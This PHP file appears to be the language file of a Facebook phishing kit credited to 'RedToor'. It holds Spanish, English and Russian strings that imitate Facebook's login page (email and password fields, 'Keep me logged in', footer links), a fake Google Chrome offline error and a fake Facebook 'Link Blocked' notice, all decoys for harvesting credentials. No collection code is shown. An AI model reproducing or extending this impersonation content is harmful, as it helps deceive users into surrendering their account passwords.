<?php
/*

 ______
 | ___|
 | |_____________________  ___ _______  __
 |  ______ | ___|  __ | |__| |/ /_ | | / /
 | || |  | | |  | ____| __ | | / | | |/ /
 | || |__| | |__| |___||_| |  /|_| |   |
 |_||____,,|____|_____|____|__|____|_|\_\
        one tool awesome for you.

 you can make your own language and if want help me
 send me the translation ;)

 RedToor.

$lang = $_SERVER[HTTP_ACCEPT_LANGUAGE];
$lang = substr ($lang,0,2);

*/


if(substr($_SERVER["HTTP_ACCEPT_LANGUAGE"],0,2)=='en'){$lang="en";}
if(substr($_SERVER["HTTP_ACCEPT_LANGUAGE"],0,2)=="ru"){$lang="ru";}else{$lang="es";}
include("inc_version.php");

// SPANISH
if ($lang=="es"){
$des="¡Bienvenido a Facebook en Español!";
$before="Regístrate";
$a="es";
$b="Ir a la p&#xe1;gina de inicio de Facebook";
$c="Entrar en Facebook";
$d="Dirección de correo electrónico no válida";
$e="El e-mail que ingresaste no pertenece a ninguna cuenta.";
$f="Puedes entrar en Facebook con cualquier dirección de correo electrónico, nombre de usuario o número de teléfono asociados con tu cuenta. Por favor, asegúrate de escribirlos correctamente.";
$g="Correo electrónico o teléfono:";
$h="Contraseña:";
$i="No cerrar sesión";
$j="Iniciar sesión";
$entr="Entrar";
$k="o";
$l=" Regístrate en Facebook";
$m="¿Has olvidado tu contraseña?";
$n="Prueba Facebook Móvil.";
$o="Móvil";
$p="Encontrar a alguien en la web";
$q="Buscar amigos";
$w="A&#xf1;adir una insignia de Facebook a tu sitio web.";
$y="Insignias";
$z="Explora nuestro directorio de personas";
$a1="Personas";
$a2="Revisa nuestro directorio.";
$a3="Páginas";
$a4="Consulta el centro de aplicaciones de Facebook.";
$a5="Aplicaciones";
$a6="Consulta los juegos de Facebook.";
$a7="Juegos";
$a8="Consulta las aplicaciones de m&#xfa;sica de Facebook.";
$a9="Música";
$b1="Navega por nuestro directorio de lugares.";
$b2="Establecimientos";
$b3="Buscar en el directorio de temas.";
$b4="Temas";
$b5="Lee nuestro blog, descubre el centro de recursos y encuentra ofertas de trabajo.";
$b6="Información";
$b7="An&#xfa;nciate en Facebook.";
$b8="Crear anuncio";
$b9="Crear una p&#xe1;gina";
$c1="Crear página";
$c2="Desarrolla en nuestra plataforma.";
$c3="Desarrolladores";
$c4="Realiza tu pr&#xf3;ximo cambio de empleo en nuestra extraordinaria empresa.";
$c5="Empleo";
$c6="Inf&#xf3;rmate acerca de tu privacidad y Facebook.";
$c7="Privacidad";
$c8="Informaci&#xf3;n sobre las cookies y Facebook.";
$c9="Cookies";
$d1="Consulta nuestras pol&#xed;ticas y condiciones.";
$d2="Condiciones";
$d3="Visita nuestro Servicio de ayuda.";
$d4="Ayuda";
$d5="Usa Facebook en otro idioma.";
$d6="Español (España)";
$mi="Mostrar m&#xe1;s idiomas";
$de="Debes entrar para ver esta pagina.";
$esta="está en Facebook.";
$para="Para conectar con";
$paras="regístrate hoy en Facebook.";
$sear="Buscar";
$phter="Otras personas";
$regi="Regístrate";
$inco="¿Es incorrecto ";
$new="Inténtalo de nuevo";
$msw="No iniciaste sesion.";
$msk="Por favor, inicia sesion para continuar.";
$aa="no está disponible.";
$bb="No se ha podido establecer conexión con Internet";
$cc="Cargar de nuevo";
$dd="Más";}
$ee="Google Chrome no puede mostrar la página web porque tu ordenador no está conectado a Internet.";
$ff="Comprueba tu conexión a Internet";
$gg="Comprueba los cables y reinicia los routers, los módems y otros dispositivos de red que estés utilizando.";
$hh="Configura tu cortafuegos o tu antivirus para permitir el acceso de Chrome a la red.";
$ii="Si ya está incluido como programa autorizado para acceder a la red, prueba a eliminarlo de la lista y volver a añadirlo.";
$ff="Código de error:";
$ma="Crear cuenta nueva";
$mb="Servicio de ayuda";
$mc="No se reconoce tu dirección de correo electrónico o tu número de teléfono.";
$md="¿Necesitas una cuenta?";
$me="No se ha encontrado la página solicitada.";
$mf="Volver a la página de inicio";
$m1="Página no encontrada";
$msw="No iniciaste sesion.";
$msk="Por favor, inicia sesion para continuar.";
$msi="Primero tienes que entrar en Facebook.";
$cra="Se ha producido un error al mostrar esta pagina web, Para continuar, Vuelva a cargar la pagina o accede a otra";
$crb="Cargar de nuevo";
$crc="Si este mensaje aparece con frecuencia, prueba a solucionarlo con estas";
$crd="sugerencias";
$pri="Creemos que el enlace al que intentas acceder es malicioso. Por tu seguridad, lo hemos bloqueado. Más información sobre cómo proteger tu cuenta. Si crees que este enlace no debería estar bloqueado, háznoslo saber.";
$enl="Enlace bloqueado";
$vol="Volver";
$home="Inicio";
$bar="Busca personas, lugares y cosas";
$titleout="Saliendo de facebook";
// ENGLISH
if ($lang=="en"){
$des="Welcome to Facebook - Log In, Sign Up or Learn More";
$before="Sign Up";
$a="en";
$b="Go to Facebook Home";
$c="Facebook Login";
$d="Incorrect Email";
$e="The email you entered does not belong to any account.";
$f="You can login using any email, username or mobile phone number associated with your account. Make sure that it is typed correctly.";
$g="Email or Phone:";
$h="Password:";
$i="Keep me logged in";
$j="Log In";
$k="or";
$l=" Sign up for Facebook";
$m="Forgot your password?";
$n="Check out Facebook Mobile.";
$o="Mobile";
$p="Find anyone on the web.";
$q="Find Friendss";
$w="Embed a Facebook badge on your website.";
$y="Badges";
$z="Browse our people directory.";
$a1="People";
$a2="Browse our pages directory.";
$a3="Pages";
$a4="Check out Facebook App Center.";
$a5="Apps";
$a6="Check out Facebook games.";
$a7="Games";
$a8="Check out Facebook music apps.";
$a9="Music";
$b1="Browse our places directory.";
$b2="Locations";
$b3="Browse our topics directory.";
$b4="Topics";
$b5="Read our blog, discover the resource center, and find job opportunities.";
$b6="About";
$b7="Advertise on Facebook.";
$b8="Create Ad";
$b9="Create a Page";
$c1="Create Page";
$c2="Develop on our platform.";
$c3="Developers";
$c4="Make your next career move to our awesome company.";
$c5="Careers";
$c6="Learn about your privacy and Facebook.";
$c7="Privacy";
$c8="Learn about cookies and Facebook.";
$c9="Cookies";
$d1="Review our terms and policies.";
$d2="Terms";
$d3="Visit our Help Center.";
$d4="Help";
$d5="Use Facebook in another language.";
$d6="English (US)";
$mi="Show more languages";
$de="You must login to view this page.";
$entr="Log in";
$esta="is on Facebook.";
$para="To connect with";
$paras="sign up for Facebook today.";
$sear="Search";
$phter="Others Person";
$regi="Sign Up";
$inco="¿Wrong ";
$new="Try Again";
$aa="not available.";
$bb="Could not connect to Internet";
$cc="Reload";
$dd="More";
$ee="Google Chrome can not display the webpage because your computer is not connected to the Internet.";
$ff="Check your internet connection";
$gg="Check cables and restart the routers, modems and other network devices you're using.";
$hh="Configure your firewall or your antivirus to allow Chrome to access the network.";
$ii="If you are already listed as authorized to access the network, try to remove it from the list and re-add program.";
$ff="Error code:";
$ma="Create New Account";
$mb="Help Center";
$mc="We didn't recognize your email address or phone number.";
$md="Need an account?";
$me="The page you requested was not found.";
$mf="Back to home";
$m1="Page Not Found";
$msw="Not logged.";
$msk="Please log in to continue.";
$msi="You must log in first.";
$cra="Something went wrong while displaying this web page. To continue. reload or go to another page.";
$crb="Reload.";
$crc="if you're seeing this frequently, try";
$crd="these suggestions";
$pri="We believe the link you are trying to visit is malicious. For your safety, we have blocked it. Learn more about keeping your account secure. If you think this link should not be blocked, please let us know.";
$enl="Link Blocked";
$vol="Go Back";
$home="home";
$bar="Search for people, places and things";
$titleout="Leaving facebook";
}
// RUSSIAN
if ($lang=="ru"){
$des="Добро пожаловать на Фейсбук - заходите, регистрируйтесь и находите друзей.";
$before="Регистрация";
$a="ru";
$b="Перейти на главную страницу Facebook";
$c="Вход на Facebook";
$d="Эл. адрес или телефон";
$e="Адрес электронной почты, который вы ввели, не связан ни с одним аккаунтом.";
$f="Вы можете войти в аккаунт, используя любой электронный адрес, имя пользователя или номер мобильного телефона, связанный с вашим аккаунтом. Убедитесь, пожалуйста, что эта информация введена верно.";
$g="Эл. адрес или телефон:";
$h="Пароль";
$i="Не выходить из системы";
$j="Вход";
$entr="Войти";
$k="или";
$l=" Зарегистрируйтесь на Facebook";
$m="Забыли пароль?";
$n="Ознакомьтесь с Facebook Mobile.";
$o="Мобильная версия";
$p="Найдите кого-нибудь в сети.";
$q="Найти друзей";
$w="Разместите визитку Facebook на своем веб-сайте.";
$y="Визитки";
$z="Просматривайте наш каталог людей.";
$a1="Люди";
$a2="Просматривайте наш каталог Страниц.";
$a3="Страницы";
$a4="Проверьте прикладную центр Facebook.";
$a5="приложений";
$a6="Оцените игры Facebook.";
$a7="Игры";
$a8="Проверьте музыкальные приложения Facebook.";
$a9="музыка";
$b1="Просмотрите наш каталог мест.";
$b2="Местонахождения";
$b3="Поиск в каталоге темы.";
$b4="Темы";
$b5="Читайте наш блог, открыть ресурсный центр, чтобы найти работу.";
$b6="информация";
$b7="Реклама на  Facebook";
$b8="Создать рекламу";
$b9="Создать Страницу";
$c1="Создать Страницу";
$c2="Развивайтесь на нашей платформе.";
$c3="Разработчикам";
$c4="Сделайте следующий шаг в карьере в нашей отличной компании.";
$c5="Вакансии";
$c6="Узнайте о своей конфиденциальности на Facebook.";
$c7="Конфиденциальность";
$c8="Узнайте больше о cookies и Facebook.";
$c9="Файлы cookie";
$d1="Просмотрите наши условия и правила.";
$d2="Условия использования";
$d3="Посетите наш справочный центр.";
$d4="Помощь";
$d5="Используйте Facebook на другом языке.";
$d6="Русский";
$mi="Показать другие языки";
$de="Войдите, чтобы продолжить.";
$esta="зарегистрирован на Facebook.";
$para="Чтобы связаться с";
$paras="зарегистрируйтесь на Facebook сегодня.";
$sear="поиск";
$phter="Другие люди с похожим именем";
$regi="Регистрация";
$inco="Это неверно ";
$new="Попробуйте еще раз";
$msw="No iniciaste sesion.";
$msk="Войдите, чтобы продолжить.";
$aa="недоступен.";
$bb="Не удается подключиться к Интернету";
$cc="Перезагружать";
$dd="Больше";
$ee="Google Chrome не может отобразить веб-страницу, так как ваш компьютер не подключен к Интернету.";
$ff="Проверьте подключение к Интернету";
$gg="Проверьте кабели и перезагрузите маршрутизаторы, модемы и другие сетевые устройства, которые вы используете.";
$hh="Настройте брандмауэр или антивирус ваши, чтобы Chrome для доступа к сети.";
$ii="Если вы уже перечислены в качестве доступа к сети, попробуйте удалить его из списка и повторно добавить программы.";
$ff="Код ошибки:";
$ma="Создать новую учетную запись";
$mb="Служба поддержки";
$mc="не ваш адрес электронной почты или номер телефона признается.";
$md="Необходим аккаунт?";
$me="Не найдено запрошенную страницу.";
$mf="Вернуться на главную";
$m1="Страница не найдена";
$msw="не вошли.";
$msk="Пожалуйста, войдите, чтобы продолжить.";
$msi="Сначала вы должны войти в Facebook.";
$cra="Был ошибка отображения этой веб-странице, чтобы продолжить, перезагрузите страницу или перейти к другому";
$crb="Перезагружать";
$crc="Если часто появляется это сообщение, попробуйте решить ее с них";
$crd="предложения";
$pri="Мы считаем, что ссылка, которую вы пытаетесь получить доступ вредоносным. Для вашей безопасности, мы их. Узнайте, как защитить свой аккаунт. Если вы думаете, это ссылка не должен быть заблокирован, дайте нам знать.";
$enl="заблокирован Ссылка";
$vol="Вернуться";
$home="Главная";
$bar="Найти людей, мест и вещей";
$titleout="Выход Facebook";
}
?>